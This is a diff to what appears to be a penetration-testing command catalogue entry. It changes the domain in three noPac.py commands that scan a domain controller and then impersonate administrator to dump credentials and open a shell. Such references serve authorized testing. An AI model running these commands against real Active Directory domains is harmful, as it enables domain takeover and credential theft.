@@ -4,9 +4,9 @@ description: |
 commands:
   - have: Credentials
     cmd: |
-      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 -scan
-      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -dump
-      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -shell
+      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 -scan
+      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -dump
+      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -shell
 phase:
   - Exploitation
 target_os:
